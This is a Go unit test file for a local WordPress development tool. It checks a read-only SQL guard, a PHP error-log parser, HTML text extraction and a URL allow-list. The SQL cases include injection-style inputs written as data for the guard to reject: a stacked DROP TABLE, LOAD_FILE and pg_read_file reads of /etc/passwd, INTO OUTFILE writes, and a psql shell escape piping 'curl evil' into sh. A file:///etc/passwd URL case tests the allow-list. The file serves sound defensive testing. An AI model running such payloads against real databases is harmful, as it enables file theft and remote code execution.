// SPDX-License-Identifier: GPL-3.0-only
// Copyright (C) 2026 Andrea Casali

package core

import (
	"strings"
	"testing"

	"github.com/getcovo/covo/internal/errcode"
)

func TestCheckReadOnlySQL(t *testing.T) {
	tests := []struct {
		sql, code string
	}{
		{"SELECT * FROM wp_options LIMIT 5", ""},
		{"  select 1;  ", ""},
		{"/* hi */ SHOW TABLES", ""},
		{"DESCRIBE wp_posts", ""},
		{"EXPLAIN SELECT 1", ""},
		{"WITH x AS (SELECT 1) SELECT * FROM x", ""},
		{"(SELECT 1) UNION (SELECT 2)", ""},
		{"", errcode.InvalidInput},
		{"DELETE FROM wp_posts", errcode.Forbidden},
		{"UPDATE wp_options SET option_value='x'", errcode.Forbidden},
		{"SELECT 1; DROP TABLE wp_users", errcode.InvalidInput},
		{"SELECT * FROM wp_users INTO OUTFILE '/tmp/x'", errcode.Forbidden},
		{"SELECT * FROM wp_users FOR UPDATE", errcode.Forbidden},
		{"SELECT LOAD_FILE('/etc/passwd')", errcode.Forbidden},
		{"SELECT SLEEP(100)", errcode.Forbidden},
		{"SELECT pg_read_file('/etc/passwd')", errcode.Forbidden},
		{"-- x\nINSERT INTO t VALUES (1)", errcode.Forbidden},
		{`SELECT 1 \! curl evil | sh`, errcode.Forbidden},
		{`SELECT 1 \o /tmp/x`, errcode.Forbidden},
		{`SELECT 1 \copy t to '/tmp/x'`, errcode.Forbidden},
		{`SELECT 1 \T /tmp/x`, errcode.Forbidden},
		{`SELECT 'a\'b'`, errcode.Forbidden},
		{"SELECT 1 /* \\! hidden */", errcode.Forbidden},
		{"SELECT 1 /*!50000 INTO OUTFILE '/tmp/x' */", errcode.Forbidden},
		{"SELECT 1 /*+ MAX_EXECUTION_TIME(10) */", ""},
	}
	for _, tt := range tests {
		_, err := checkReadOnlySQL(tt.sql)
		if got := errcode.Code(err); (err == nil) != (tt.code == "") || (err != nil && got != tt.code) {
			t.Errorf("checkReadOnlySQL(%q) = %v, want %q", tt.sql, err, tt.code)
		}
	}
}

func TestParsePHPLog(t *testing.T) {
	log := `[04-Nov-2026 14:02:03 UTC] PHP Deprecated:  Creation of dynamic property Foo::$bar is deprecated in /site/a.php on line 7
[04-Nov-2026 14:02:03 UTC] PHP Warning:  Undefined variable $x in /site/b.php on line 3
[04-Nov-2026 14:02:03 UTC] PHP Fatal error:  Uncaught Error: Call to undefined function nope() in /site/c.php:12
Stack trace:
#0 {main}
  thrown in /site/c.php on line 12
[04-Nov-2026 14:02:03 UTC] PHP Notice:  Something`
	got := parsePHPLog(log)
	if len(got) != 4 {
		t.Fatalf("messages = %+v", got)
	}
	want := []PHPMessage{
		{Level: "deprecated", File: "/site/a.php", Line: 7},
		{Level: "warning", File: "/site/b.php", Line: 3},
		{Level: "fatal", File: "/site/c.php", Line: 12},
		{Level: "notice"},
	}
	for i, w := range want {
		if got[i].Level != w.Level || got[i].File != w.File || got[i].Line != w.Line {
			t.Errorf("message %d = %+v, want %+v", i, got[i], w)
		}
	}
	if !strings.Contains(got[2].Message, "Stack trace") {
		t.Errorf("stack trace not kept: %q", got[2].Message)
	}
}

func TestPageText(t *testing.T) {
	title, text := pageText(`<html><head><title>Shop &amp; Co</title><style>p{color:red}</style></head>
<body><script>var x = "<p>no</p>";</script><h1>Hello</h1><p>World &euro; <b>5</b></p><!-- secret --></body></html>`)
	if title != "Shop & Co" || text != "Shop & Co\nHello\nWorld € 5" {
		t.Fatalf("title %q, text %q", title, text)
	}
}

func TestFetchTarget(t *testing.T) {
	hosts := []string{"shop.localhost", "www.shop.localhost", "blog.localhost"}
	for _, tt := range []struct {
		path, want, code string
	}{
		{"", "https://shop.localhost:8443/", ""},
		{"/cart?x=1", "https://shop.localhost:8443/cart?x=1", ""},
		{"https://blog.localhost:8443/feed", "https://blog.localhost:8443/feed", ""},
		{"http://www.shop.localhost/x", "https://www.shop.localhost:8443/x", ""},
		{"https://example.com/", "", errcode.Forbidden},
		{"https://127.0.0.1:8443/", "", errcode.Forbidden},
		{"file:///etc/passwd", "", errcode.Forbidden},
	} {
		u, err := fetchTarget("https://shop.localhost:8443", tt.path, hosts)
		if tt.code != "" {
			if errcode.Code(err) != tt.code {
				t.Errorf("%q: err = %v", tt.path, err)
			}
			continue
		}
		if err != nil || u.String() != tt.want {
			t.Errorf("%q = %v, %v; want %s", tt.path, u, err, tt.want)
		}
	}
}
